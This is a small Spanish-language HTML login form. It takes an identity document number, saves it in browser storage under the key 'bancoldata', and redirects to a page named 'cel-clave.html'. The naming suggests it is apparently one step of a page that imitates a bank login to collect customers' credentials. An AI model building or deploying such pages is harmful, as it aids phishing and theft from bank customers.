<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario básico</title>
</head>
<body>

    <h2>Ingreso</h2>

    <!-- Número de documento -->
    <label>Número de documento</label><br>
    <input type="number" id="userInput"><br><br>

    <!-- Recordar -->
    <input type="checkbox" id="rememberDoc">
    <label for="rememberDoc">Recordar número</label><br><br>

    <!-- Botón -->
    <button id="continueButton">Continuar</button>

    <script>
        const userInput = document.getElementById('userInput');
        const continueButton = document.getElementById('continueButton');

        continueButton.addEventListener('click', () => {
            const userValue = userInput.value.trim();

            if (userValue.length >= 4) {
                let data = {};

                try {
                    data = JSON.parse(localStorage.getItem('bancoldata')) || {};
                } catch (e) {
                    data = {};
                }

                data.usuario = userValue;
                data.fecha = new Date().toISOString();

                if (document.getElementById('rememberDoc').checked) {
                    data.rememberDocument = true;
                }

                localStorage.setItem('bancoldata', JSON.stringify(data));

                // Redirección
                window.location.href = 'cel-clave.html';
            } else {
                alert('Ingrese mínimo 4 dígitos');
            }
        });
    </script>

</body>
</html>
